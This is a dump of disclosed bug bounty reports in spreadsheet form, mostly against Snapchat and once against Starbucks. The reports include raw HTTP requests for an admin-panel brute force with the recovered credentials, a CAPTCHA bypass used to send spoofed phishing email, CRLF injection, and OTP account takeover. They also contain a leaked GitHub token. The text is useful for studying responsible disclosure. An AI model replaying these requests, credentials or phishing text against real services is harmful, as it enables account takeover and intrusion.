While doing some recon for Snapchat's domains, I came across a particular domain of interest - sc-corp.net. It seems that this domain hosts a lot of Snapchat's internal tools, web applications and staging environments such as Phabricator and other administration panels.
From analyzing SSL certificates, I came across the following IP address which contained a wild card common name of *.sc-corp.net:
https://146.148.42.38/
Upon visiting the above IP address, I was prompted with a basic authentication prompt. Even though I clicked cancel and did not authenticate to the panel, the Django REST API panel was returned - albeit in an unauthenticated state.
In order to gain authenticated access to the REST API and the Django administration panels, I ran a small scale bruteforce against the login endpoint located at https://146.148.42.38/api-auth/login/. The following HTTP request was used to perform the bruteforce attack in Burp Intruder:
Code 716 BytesWrap lines Copy Download1POST /api-auth/login/ HTTP/1.1
2Host: 146.148.42.38
3Connection: close
4Content-Length: 108
5Cache-Control: max-age=0
6Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
7Origin: https://146.148.42.38
8Upgrade-Insecure-Requests: 1
9User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
10Content-Type: application/x-www-form-urlencoded
11DNT: 1
12Referer: https://146.148.42.38/api-auth/login/
13Accept-Encoding: gzip, deflate
14Accept-Language: en-US,en;q=0.8
15Cookie: csrftoken=Gt5IRFhlh8BekC11btkUdo8doBniN2pJ
16
17csrfmiddlewaretoken=Gt5IRFhlh8BekC11btkUdo8doBniN2pJ&next=%2F&username=admin&password=§password§&submit=Log+in
With a password list of approximately 10,000, I was able to determine the credentials for the Django administration panel after a total of 2459 requests. I've attached a screenshot of the Burp Intruder window showing the successful bruteforce attack (burp_intruder_snapchat_django.png).
Since I now had the credentials (username: admin and password: research), I was then able to use them to access the Django administration panel located at https://146.148.42.38/admin/.
I've attached some screenshots to show the level of access I obtained to the administration panel (snapchatdjango_admin_panel[0-3].png).
Additionally, with the credentials bruteforced, I was able to interact with the Django REST API without any restrictions - i.e. I was able to add new users and groups via the API. Screenshots attached (snapchatdjango_rest_api[0-3].png).
I made no further attempts to escalate privileges on the machine, nor attempted to gain a reverse shell.
I believe that since this machine's SSL certificate's CNAME was *.sc-corp.net, it's likely that there is an actual subdomain that is pointing to this IP. While I was unable to determine the subdomain's name via bruteforcing or enumeration, if there is a valid subdomain pointing to this IP, the severity of this issue could be much higher.
I also assume that since it's most likely within the sc-corp.net scope, the machine itself might have privileged access to the Snapchat internal network on Google Cloud. If I were a malicious attacker, I would attempt to first gain a shell on this machine using my now privileged access and then attempt to pivot onto the Snapchat internal network.
An alternate attack route would be to gain persistent cross-site scripting on the machine with my administrative access and then perform phishing / cookie stealing attacks for applications that run on a subdomain of sc-corp.net. For example, there's Phabricator running on ph.sc-corp.net and this would be a prime target for an attacker to gain access to. This would require the attacker to know the subdomain on sc-corp.net that points to 146.148.42.38.
Please don't hesitate if there are any questions or if you require any further information.
Cheers
Shubs7 attachments:F83042: burp_intruder_snapchat_django.pngF83046: snapchat_django_admin_panel_2.pngF83047: snapchat_django_admin_panel_3.pngF83048: snapchat_django_admin_panel_1.pngF83049: snapchat_django_rest_api_3.pngF83050: snapchat_django_rest_api_2.pngF83051: snapchat_django_rest_api_1.png",https://hackerone.com/reports/128114,California,United States,Los Angeles,2016,4,4,6,29
Snapchat,1001-5000,0.0,200m-1b,"$1,000.00",Medium,5.45,Information Exposure Through Directory Listing,Bitmoji source code is accessible,"rms  submitted a report to Snapchat.Jan 2nd (5 years ago)hi team,
I'm starting my research on snapchat by scanning all sub-domains on all the domains in-scope: snapchat.com, bitmoji.com, etc.
Let's look at one of the urls, https://rendering-service.prod.us-east.bitstrips.com/
When I request GET https://rendering-service.prod.us-east.bitstrips.com/
The response is  403 Forbidden
After searching, I've found /WEB-INF/ & /META-INF/ directories, which are accessibles and allow directory listing. 
Inside /WEB-INF/ we have all the .class files of bitmoji, we can download all the files.
Then by using a java decompiler such as procyon-decompiler we reverse the .class files to make those readable. 
best,
hermès.
Impact
Source code leaked3 attachments:F250888: Screen_Shot_2018-01-02_at_17.51.06.pngF250889: Screen_Shot_2018-01-02_at_17.51.21.pngF250890: Screen_Shot_2018-01-02_at_17.48.45.png",https://hackerone.com/reports/301812,California,United States,Los Angeles,2018,1,2,17,2
Snapchat,1001-5000,0.0,200m-1b,"$1,250.00",Medium,5.45,Business Logic Errors,Bypass Rate Limits on app.snapchat.com API Endpoint via X-Forwarded-For Header,sicarius  submitted a report to Snapchat.Nov 1st (3 years ago),https://hackerone.com/reports/727487,California,United States,Los Angeles,2019,11,1,16,10
Snapchat,1001-5000,0.0,200m-1b,$250.00,No value,0.0,Improper Authentication - Generic,"Bypassing ""You've requested your data the maximum number of times today."" + ""Please Verify an email address with snapchat to continue"" ","marwan  submitted a report to Snapchat.Sep 30th (6 years ago)Hello Again , I found an 2 issues in accounts.snapchat.com/accounts/downloadmydata 

The first one : Bypassing The maximum number of Data Requests per day and download the Account Data any time the Attacker wants.
The Second : Download The Account Data without any Email verification.


Requirements :

Snapchat Account.
Software to intercept the request.


Summary: [First_Issue]
According to This note in Download My Data Page
Note: There is a limit to the number of times per day you can download your data.  and when the user do more than 2 requests Per day another massage appear saying "" You've requested your data the maximum number of times today. Please try again tomorrow.  . By Using this Infected POST Method POST /accounts/downloadmydata HTTP/1.1  the Attacker can Make Unlimited Data requests Per day at any time he want without any restriction and every time he do it the site creates new download link + send a massage to his email, He even Can run intruder Attack Without any TIMEOUT.

Steps To Produce[First_Issue][Text_vresion]
// Note : The first three steps If the Attacker Doesn't Have the Request Yet. //
1- Login to Activated Account throw https://accounts.snapchat.com/accounts/login
2- Browse to https://accounts.snapchat.com/accounts/downloadmydata
3- Trun on Intercept and click on Submit Request Button now send the request to The Repeater, and Go back to the page and click the button again to reach the maximum times per day.
4- Now when you refresh the page a massage appears saying ""You've requested your data the maximum number of times today.""
5- Now go back to the repeater and repeat the request and every time the attacker repeat it a new download link generates  + an email sent to his email.
Image F124019: Unlimited_Requests_Per_Day_POC.png 131.50 KiBZoom in Zoom out Copy Download

Summary: [Second_Issue]
According to This Support page 
""We take the security of your data very seriously, so you [must] have a verified email address to download your data."" , Well Using The Same POST Method The Attacker can replace The Cookie and the xsrf_token too his own then repeat the request and the download link will pop-up after refreshing the page., Even when the page have a massage says ""Please Verify an email address with snapchat to continue"".

Steps To Produce[Second_Issue][Text_vresion]
1- The Attacker will use the same POST Method that already saved in the repeater / Used in Issue one /
Code 719 BytesWrap lines Copy Download1POST /accounts/unlock HTTP/1.1
2Host: accounts.snapchat.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Referer: https://accounts.snapchat.com/
8Cookie: xsrf_token=qGtjuAOo2-wbMhSh5pSleQ; sc-a-session=MDAxOjAwMTrcu9aIg5J6CABp9Jgq2spVOpj0cpFQFvfTGYYk8x1lEB6EK9Ii4_-ThiXAIwaPuGx0zNKyVJNVWpF5lV7ouGvH; sc-cookies-popup-dismissed=true; sc-a-nonce=a0979ef3-d7e0-4f53-8514-cc7984ebb8fa
9DNT: 1
10Connection: close
11Upgrade-Insecure-Requests: 1
12Content-Type: application/x-www-form-urlencoded
13Content-Length: 38
14
15xsrf_token=AoaRT596SUeoTsWqXjzNPQvsZko
2- The Attacker will change The  xsrf_token=kB5hC3JiO-au9yaO83iOTMqCvM4 & cookie But How he will get the New xsrf_token of the session ? Simply By logging in to his account then Browse to https://accounts.snapchat.com/accounts/unlock and turn on intercept then click The ""Unblock"" Button. Now the New cookie and the xsrf_token Will show up in the request Like This :
Code 769 BytesWrap lines Copy Download1POST /accounts/unlock HTTP/1.1
2Host: accounts.snapchat.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Referer: https://accounts.snapchat.com/
8Cookie: xsrf_token=9a8P2IH9ehlGqcMEoMdYhQ; sc-a-session=MDAxOjAwMTrSJkcOKBemtdP07Rus9rErOnjN2IzGZfERcnmbHdGfXAMoxOocWkm0VbnVJ-FopWhFYdiLF__mnp1BBrE; _ga=GA1.2.1347861360.1475026774; sc-cookies-popup-dismissed=true; sc-language=en-US; sc-a-nonce=d15d9f88-6fd0-4aeb-9ebe-d878f7eea3e0
9Connection: close
10Upgrade-Insecure-Requests: 1
11Content-Type: application/x-www-form-urlencoded
12Content-Length: 38
13
14xsrf_token=YdA7InrMTUVKsPDtuNtUB1HZHdI <======= 
3- Now The will Attacker go Back to the First request and replace the xsrf_token and the cookie of the session with the right one.
4- Now Repeat The Request and refresh Download My Data Page you will see The Zip file link at the top Section / ""Your Data is Ready "" / and in the bottom you will see This Massage ""Please Verify an email address with snapchat to continue"".
Image F124016: Not_verified_POC.png 70.14 KiBZoom in Zoom out Copy Download

POC Shows The two Issues With Full_Steps [Video]:
https://youtu.be/fzHxL8QZ9AE

Other stuff|:
So what if the Attacker Logout After Doing issue one , When he login again in a different day and use the same method the server will response with  302 Found , To fix this he will use the same Trick that he used in issue 2, By browsing to accounts/unlock etc etc."" and do unlimited requests again.

Thank you for your patience
Best regards,
@Marwan2 attachments:F124016: Not_verified_POC.pngF124019: Unlimited_Requests_Per_Day_POC.png",https://hackerone.com/reports/173043,California,United States,Los Angeles,2016,9,30,0,38
Snapchat,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Captcha Bypass in Snapchat's Geofilter Submission Process,"zero  submitted a report to Snapchat.Apr 3rd (8 years ago)Hi,
Overview:
Snapchat provides a form in which users can submit ""Geofilters"". These are filters which get applied to users snaps when they are in specific geolocations. The form (https://www.snapchat.com/geofilters/submit.html) allows for the submission of these ""Geofilters"" as an anonymous user.
The following information is submitted through this form:

Image (filter in PNG format) (image_data)
Name (user_name)
Email (user_email)
Description (description)
Notes (notes)

Vulnerability description:
The HTTP header g-recaptcha-response is not validated on the server-side when submitting a Geofilter to the endpoint /_ah/api/geofilter/v1/submission located on geofilter-dot-feelinsonice-hrd.appspot.com. Any or no value can be provided for this header. 
Since no CAPTCHA verification is needed, an attacker can then conduct a bulk email sending campaign on behalf of the email address no_reply.geofilters@snapchat.com. In addition to this, the attacker can spoof the contents of the email by customising the user_name, notes or description parameters.
Technical description:
After successfully passing the CAPTCHA and submitting the Geofilter, a POST HTTP request is sent to geofilter-dot-feelinsonice-hrd.appspot.com :
Code 1.11 KiBWrap lines Copy Download1POST /_ah/api/geofilter/v1/submission HTTP/1.1
2Host: geofilter-dot-feelinsonice-hrd.appspot.com
3Connection: keep-alive
4Content-Length: 496
5Snapchat-CSRF-Protection: not-a-secret
6Origin: https://www.snapchat.com
7g-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things
8User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36
9Content-Type: application/json; charset=UTF-8
10Accept: application/json, text/javascript, */*; q=0.01
11DNT: 1
12Referer: https://www.snapchat.com/geofilters/submit.html
13Accept-Encoding: gzip, deflate
14Accept-Language: en-US,en;q=0.8
15
16{""image_data"":""abcdefg"",""image_type"":""PNG"",""user_name"":""Shubham"",""user_email"":""admin+1@shubh.am"",""notes"":""lol"",""description"":""lol "",""geofence_polygon"":""[{\""lat\"":34.08166844698418,\""long\"":-118.35296630859375},{\""lat\"":34.16465895459983,\""long\"":-118.38180541992188},{\""lat\"":34.10725639663118,\""long\"":-118.30490112304688},{\""lat\"":34.10498222546687,\""long\"":-118.38180541992188},{\""lat\"":34.165227101802884,\""long\"":-118.33992004394531}]"",""start_millis"":null,""end_millis"":null,""is_event"":false}
Note: In this request, the header g-recaptcha-response does not have a valid token value. Instead, for demonstration purposes I have changed it to I_love_cats_and_kittens_and_all_fluffy_things (I actually do love kittens, but that's not the point). 
The same request can be sent with the very same token above or with no token at all, and it will still succeed. This is where the primary vulnerability lies.
By sending the above request, my email (admin+1@shubh.am) will receive an email along the lines of the following: https://i.imgur.com/EF588pW.png (also attached as email1.png).
We can spoof the contents of this email by modifying the ""user_name"" parameter sent in our request. Take the following POST request into consideration:
Code 1.29 KiBWrap lines Copy Download1POST /_ah/api/geofilter/v1/submission HTTP/1.1
2Host: geofilter-dot-feelinsonice-hrd.appspot.com
3Connection: keep-alive
4Content-Length: 496
5Snapchat-CSRF-Protection: not-a-secret
6Origin: https://www.snapchat.com
7g-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things
8User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36
9Content-Type: application/json; charset=UTF-8
10Accept: application/json, text/javascript, */*; q=0.01
11DNT: 1
12Referer: https://www.snapchat.com/geofilters/submit.html
13Accept-Encoding: gzip, deflate
14Accept-Language: en-US,en;q=0.8
15
16{""image_data"":""abcdefg"",""image_type"":""PNG"",""user_name"":""Shubham, in order for Snapchat to accept your Geofilter, you must activate by logging into https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215. Thank you"",""user_email"":""admin+1@shubh.am"",""notes"":""lol"",""description"":""lol "",""geofence_polygon"":""[{\""lat\"":34.08166844698418,\""long\"":-118.35296630859375},{\""lat\"":34.16465895459983,\""long\"":-118.38180541992188},{\""lat\"":34.10725639663118,\""long\"":-118.30490112304688},{\""lat\"":34.10498222546687,\""long\"":-118.38180541992188},{\""lat\"":34.165227101802884,\""long\"":-118.33992004394531}]"",""start_millis"":null,""end_millis"":null,""is_event"":false}
The email received by the victim (in this case my email) will look like this: http://i.imgur.com/Xkyw7gV.png (also attached as email2.png).
Impact:
The link https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215 is automatically converted into a link (for most web email clients). In addition to this, some email clients (such as Gmail) will hide the rest of the email as it is a duplicate of a previous email (redundant). This makes the malicious email look even more convincing.
These factors combined, allow for a convincing email to be sent, on behalf of the official Snapchat Geofilter API email no_reply.geofilters@snapchat.com. The attacker could leverage this vulnerability to send out emails on behalf of Snapchat. Over 1000 POST requests were sent using 50 threads. No rate limiting or limits were experienced. All 1000 emails were sent.
Additionally, since the images are physically stored somewhere and the emails are sent per request - this vulnerability could also act as a DoS issue for Snapchat. The image_data field in the JSON object sent, is not checked for whether or not it is a valid image. Regardless of the contents, the contents are saved somewhere on Snapchat's servers. Through testing, I found that there were no obvious restrictions to how big of an image could be uploaded via this API.
Both email quota's and file storage quota's could be consumed through the abuse of this API endpoint.
Remediation suggestions:
In order to address this design flaw, the following steps can be taken:

Ensure that the Captcha verification token is being validated on the server-side.
Limit the number of requests which can be sent to this endpoint (time based or number of submissions).
Set a limit on the size of the image which can be sent and/or saved to Snapchat's servers.

Please do not hesitate to contact if any additional details are required regarding this bug.
Thank you,
Shubham2 attachments:F33630: email1.pngF33635: email2.png",https://hackerone.com/reports/54641,California,United States,Los Angeles,2015,4,3,12,44
Snapchat,1001-5000,0.0,200m-1b,$500.00,High,7.95,Improper Access Control - Generic,"Client IP Spoofing using ""X-Forwarded-For: 127.0.0.1"" on ""studio-app.snapchat.com"" exposing bucket details","damian89  submitted a report to Snapchat.Jul 17th (4 years ago)Summary by damian89By adding ""X-Forwarded-For: 127.0.0.1"" as a header while requesting a certain path on a certain snapchat resource, an attacker was able to (non-sensitive) details about the underlying system/bucket.",https://hackerone.com/reports/382678,California,United States,Los Angeles,2018,7,17,17,55
Snapchat,1001-5000,0.0,200m-1b,$500.00,Medium,5.45,CRLF Injection,CRLF Injection at vpn.bitstrips.com,"wplus  submitted a report to Snapchat.Jun 6th (5 years ago)HI
I found that the site https://vpn.bitstrips.com/ is vulnerable to a CRLF Injection.
By injecting a Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header.
GET Request :
Code 595 BytesWrap lines Copy Download1
2https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1
3
4Host: vpn.bitstrips.com
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
6Accept: text/plain, */*
7Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
8Accept-Encoding: gzip, deflate, br
9Content-Type: application/x-www-form-urlencoded
10X-Requested-With: XMLHttpRequest
11X-OpenVPN: 1
12X-CWS-Proto-Ver: 2
13Referer: https://vpn.bitstrips.com/?src=connect
14Content-Length: 29
15Cookie: openvpn_sess_73209e0b8ad597c3861a05a79e873389=e769bd6ab9896e586227df60f33836f0
16Connection: keep-alive
17
Response:
Code 206 BytesWrap lines Copy Download1HTTP/1.1 302 Found
2Transfer-Encoding: chunked
3Date: Tue, 06 Jun 2017 20:00:36 GMT
4Content-Type: text/html; charset=UTF-8
5Location: https://vpn.bitstrips.com/
6Set-Cookie: malicious_cookie1
7Server: OpenVPN-AS
As can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.
To mitigate this issue, the application should strip out any input which contains the %0d%0a URL encoded characters.",https://hackerone.com/reports/237357,California,United States,Los Angeles,2017,6,6,20,3
Snapchat,1001-5000,0.0,200m-1b,"$25,000.00",Critical,9.5,OS Command Injection,Exposed Kubernetes API - RCE/Exposed Creds,"txt3rob  submitted a report to Snapchat.Dec 4th (4 years ago)Summary by txt3robDuring a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public. 
With access to this API I was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.",https://hackerone.com/reports/455645,California,United States,Los Angeles,2018,12,4,23,34
Snapchat,1001-5000,0.0,200m-1b,$250.00,Low,2.0,Cross-Site Request Forgery (CSRF),CSRF when unlocking lenses leads to lenses being forcefully installed without user interaction,"sdushantha  submitted a report to Snapchat.Jan 23rd (2 years ago)Hi,
The url below allows a user to unlock a particular lens. Once they have opened the URL on their phone, Snapchat opens up and prompts the user to unlock this lens.
Code 96 BytesWrap lines Copy Download1https://www.snapchat.com/unlock/?type=SNAPCODE&uuid=6ff5a565fca249a1948b1963ee2881b4&metadata=01
By changing the value of  type in the URL above, from SNAPCODE to SNAPCODE_NO_PROMPT, we can bypass the prompt mentioned earlier, and instead forcefully unlock the lens and make them use it, hence why this is a CSRF:
Code 106 BytesWrap lines Copy Download1https://www.snapchat.com/unlock/?type=SNAPCODE_NO_PROMPT&uuid=6ff5a565fca249a1948b1963ee2881b4&metadata=01
This issue also happens to Snapchat's deeplink on Android:
Code 92 BytesWrap lines Copy Download1snapchat://unlock/?type=SNAPCODE_NO_PROMPT&uuid=6ff5a565fca249a1948b1963ee2881b4&metadata=01
I do not have an iOS device but I am certain that this issue also occurs on the iOS version of Snapchat.
Impact
A Snapchat lens developer can abuse this bug and increase the number of people who use their lens by making people opening the URL to the lens and replacing SNAPCODE with SNAPCODE_NO_PROMPT.  This can cause false popularity for that lens as it is being unlocked without the user wanting to do so. This would then lead to the user having to manually delete the lense that was automatically added.",https://hackerone.com/reports/1085336,California,United States,Los Angeles,2021,1,23,14,19
Snapchat,1001-5000,0.0,200m-1b,"$15,000.00",Critical,9.8,Cleartext Storage of Sensitive Information,Github Token Leaked publicly for https://github.sc-corp.net,"th3g3nt3lman  submitted a report to Snapchat.Aug 17th (4 years ago)Description :
GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and similar services as i was able to find github token indexed 7 hours Ago by user ██████ - Software Engineer - Snap Inc
Issue & POC :
You can find the leak in this link :
https://github.com/█████/leetcode/blob/0eec6434940a01e490d5eecea9baf4778836c54e/TopicMatch.py
Code 611 BytesWrap lines Copy Download1
2import os
3import requests
4import sys
5pull_number = 76793
6pull_url = ""https://github.sc-corp.net/api/v3/repos/Snapchat/android/pulls/"" + str(pull_number)
7payload = {}
8payload[""Authorization""] = ""token "" + ""9db9ca3440e535d90408a32a9c03d415979da910""
9print payload
10r = requests.get(pull_url,
11
12```
13
14## Impact
15
16I didn't try anything with the token, and dont know what access it has, and i know that in order to login to https://github.sc-corp.net you need to have an email @snap but still i though it would be a good idea to share this finding with you in case it can be used in a way that i dont know.
17
18Best Regards",https://hackerone.com/reports/396467,California,United States,Los Angeles,2018,8,17,9,49
Snapchat,1001-5000,0.0,200m-1b,"$25,000.00",Critical,9.3,Improper Authentication - Generic,Improper Authentication - any user can login as other user with otp/logout & otp/login,"korniltsev  submitted a report to Snapchat.Jul 13th (2 years ago)'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.
I will demonstrate the problem on two accounts.
Victim: ███
Attacker: ██████████

Attacker perform a usuall login to attacker's personal account.
Attacker performs /scauth/otp/droid/logout but instead of attacker's user_id, attacker provides victim's user_id
request

Code 482 BytesWrap lines Copy Download1POST /scauth/otp/droid/logout HTTP/1.1
2Host: gcp.api.snapchat.com
3Connection: close
4Content-Length: 168
5X-Snapchat-Client-Auth: ██████
6X-Snapchat-UUID: ███
7x-snapchat-userid: █████
8username: ███
9req_token: █████████
10timestamp: 1594604280000
11Accept: application/json
12User-Agent: Snapchat/10.78.1.0 █████
13Accept-Language: en-GB;q=1, en;q=0.9
14Content-Type: application/json; charset=utf-8
15Accept-Encoding: gzip, deflate
16
17{""user_id"":""████"",""device_id"":""███████"",""device_name"":""███████""}
 response
Code 696 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2date: Mon, 13 Jul 2020 01:39:18 GMT
3content-type: application/json;charset=utf-8
4vary: Accept-Encoding
5x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
6server: API Gateway
7cache-control: no-cache, no-store
8x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
9x-snapchat-request-id: █████
10x-snapchat-server-latency: 342
11strict-transport-security: max-age=31536000; includeSubDomains
12Via: 1.1 google, 1.1 google
13Alt-Svc: h3-Q050="":443""; ma=2592000,h3-Q046="":443""; ma=2592000,h3-Q043="":443""; ma=2592000,quic="":443""; ma=2592000; v=""46,43""
14Connection: close
15Content-Length: 137
16
17{""status"":""SUCCESS"",""user_id"":""█████████"",""token"":""█████"",""expiry_hint"":████}
Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.

Attacker performs /scauth/otp/login request with username equal victim's username, and the token obtained on previous step.

Code 756 BytesWrap lines Copy Download1POST /scauth/otp/login HTTP/1.1
2Host: gcp.api.snapchat.com
3Connection: close
4Content-Length: 6213
5X-Snapchat-Client-Auth: ██████
6X-Snapchat-UUID: ████████
7User-Agent: Snapchat/10.78.1.0 ██████
8Accept: application/json
9Accept-Language: en-GB;q=1, en;q=0.9
10Content-Type: application/x-www-form-urlencoded; charset=utf-8
11Accept-Encoding: gzip, deflate
12
13application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
response
Code 738 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2date: Mon, 13 Jul 2020 01:40:18 GMT
3content-type: application/json;charset=utf-8
4vary: Accept-Encoding,Accept-Encoding
5x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c
6server: API Gateway
7cache-control: no-cache, no-store
8x-snap-refresh-token: ████
9x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
10x-snap-access-tokens: ███
11x-snapchat-request-id: ████████
12strict-transport-security: max-age=31536000; includeSubDomains
13Via: 1.1 google, 1.1 google
14Alt-Svc: h3-Q050="":443""; ma=2592000,h3-Q046="":443""; ma=2592000,h3-Q043="":443""; ma=2592000,quic="":443""; ma=2592000; v=""46,43""
15Connection: close
16Content-Length: 138867
17
18{""updates_response"":{""logged"":true,""username"":""█████"",""user_id"":""█████"",...
An attacker successfully performed login as victim.
Victim's user_id can be easily obtained with friends request.
I've attached the following:

a screencast to showcase the problem.
burp project ████
logout+login raw requests exported from burp
a python script to perform the attack

I've tested this bug only on my personal accounts.
███████
███
█████████
Impact
An attacker is able to  login as any user.",https://hackerone.com/reports/921780,California,United States,Los Angeles,2020,7,13,2,18
Snapchat,1001-5000,0.0,200m-1b,$250.00,No value,0.0,None,Incoming email hijacking on sc-cdn.net,"rubyroobs  submitted a report to Snapchat.Sep 15th (6 years ago)Hey guys!
Really interesting find here.
Summary
These dangling MX records on sc-cdn.net have allowed me to purchase an email account with GoDaddy (owner of these servers) and send/receive email from an account on this domain.
Code 104 BytesWrap lines Copy Download1sc-cdn.net.		3599	IN	MX	0 smtp.secureserver.net.
2sc-cdn.net.		3599	IN	MX	10 mailstore1.secureserver.net.
Reproduction
As I now ""own"" this email URL on GoDaddy, in theory you can't register another email address yourself. To prove that I've taken it over, feel free to email me on rubyroobs@sc-cdn.net and I'll be able to paste the message I receive into here to prove ownership of it.
Mitigation
Delete these DNS records to avoid mail being hijacked on this domain.
Impact
I believe impact of hijacking incoming emails on this address far outweighs the smaller consequences of missing SPF records. This would allow me to setup accounts on this email and in some cases allow me to prove control of the domain or impersonation of Snapchat staff.
Been super fun investigating this - not my typical find honestly :D. Let me know if you need any help triaging!
Cheers,
@rubyroobs",https://hackerone.com/reports/168476,California,United States,Los Angeles,2016,9,15,2,13
Snapchat,1001-5000,0.0,200m-1b,"$15,000.00",High,7.95,Information Disclosure,Leaked JFrog Artifactory  username and password exposed on GitHub - https://snapchat.jfrog.io,kiyell  submitted a report to Snapchat.Jun 30th (2 years ago),https://hackerone.com/reports/911606,California,United States,Los Angeles,2020,6,30,5,0
Snapchat,1001-5000,0.0,200m-1b,"$15,000.00",High,7.95,Information Disclosure,Open prod Jenkins instance,preben  submitted a report to Snapchat.May 24th (5 years ago),https://hackerone.com/reports/231460,California,United States,Los Angeles,2017,5,24,14,42
Snapchat,1001-5000,0.0,200m-1b,$250.00,Low,2.0,Privilege Escalation,Organization Members in Snap Kit may Deactivate Apps,mainteemoforfun  submitted a report to Snapchat.Feb 15th (2 years ago),https://hackerone.com/reports/1103448,California,United States,Los Angeles,2021,2,15,4,13
Starbucks,10001,0.0,over-1b,$500.00,High,7.95,Information Disclosure,[mena.starbucks.com] Laravel App Log & Configuration Disclosure.,bobrov  submitted a report to Starbucks.Aug 27th (4 years ago),https://hackerone.com/reports/401098,Washington,United States,Seattle,2018,8,27,15,57
Starbucks,10001,0.0,over-1b,$250.00,Medium,5.3,None,Backup Source Code Detected,"linkks  submitted a report to Starbucks.Aug 1st (4 years ago)Impact
Depending on the nature of the source code disclosed, an attacker can mount one or more of the following types of attacks:•Access the database or other data resources. With the privileges of the account obtained, attempt to read, update or delete arbitrary data from the database.
•Access password protected administrative mechanisms such as ""dashboard"", ""management console"" and ""admin panel"" potentially leading to full control of the application.
•Develop further attacks by investigating the source code for input validation errors and logic vulnerabilities.
Actions to Take
Remove all temporary and backup files.
Required Skills for Successful Exploitation
This is dependent on the information obtained from source code. Uncovering these forms of vulnerabilities does not require high levels of skills. However, a highly skilled attacker could leverage this form of vulnerability to obtain account information for databases or administrative panels, ultimately leading to control of the application or even the host the application resides on.
Impact
GET /howto/store/order.html~ HTTP/1.1
Host: www.starbucks.co.jp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=██████; registerParams[0]=card; registerParams[1]=https%3A%2F%2Fcard.starbucks.co.jp%2Fmystarbucks%2Fcard%2FregisterMsc%2F
Referer: http://www.starbucks.co.jp/howto/store/order.html~
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
Code 561 BytesWrap lines Copy Download1<?php
2include_once($_SERVER['DOCUMENT_ROOT'].""/config.inc.php"");
3
4// ãƒšãƒ¼ã‚¸ãƒ—ãƒãƒ‘ãƒ†ã‚£è¨å®š
5$pageProperties['title'] = ""How to ã‚ªãƒ¼ãƒ€ãƒ¼"";
6$pageProperties['description'] = ""ã‚¹ã‚¿ãƒ¼ãƒãƒƒã‚¯ã‚¹ã§ã¯ãŠå®¢æ§˜ã®ã”å¸Œæœ›ã«å¿œãˆã‚‰ã‚Œã‚‹ã‚ˆã†ã€æ§˜ã€…ãªã‚ªãƒ¼ãƒ€ãƒ¼ã‚·ã‚¹ãƒ†ãƒ ã‚’ã”ç”¨æ„ã—ã¦ã„ã¾ã™ã€‚"";
7$pageProperties['keyword'] = _BASE_META_KEYWORD_."",ä½¿ã„æ–¹,how,ã‚ªãƒ¼ãƒ€ãƒ¼,æ³¨æ–‡,order,ãƒ“ãƒãƒ¬ãƒƒã‚¸,beverage,ãƒ¡ãƒ‹ãƒ¥ãƒ¼,menu,ã‚µã‚¤ã‚º,size"";
8$pageProperties['ogImage'] = ""http://www.starbucks.co.jp/images/og/howto-order.jpg"";
9?>
<!DOCTYPE html>
Code 9.19 KiBWrap lines Copy Download1<html lang=""ja"">
2<head>
3<meta charset=""utf-8"">
4<title><?php echo $pageProperties['title']; ?>ï½œã‚¹ã‚¿ãƒ¼ãƒãƒƒã‚¯ã‚¹ ã‚³ãƒ¼ãƒ’ãƒ¼ ã‚¸ãƒ£ãƒ‘ãƒ³</title>
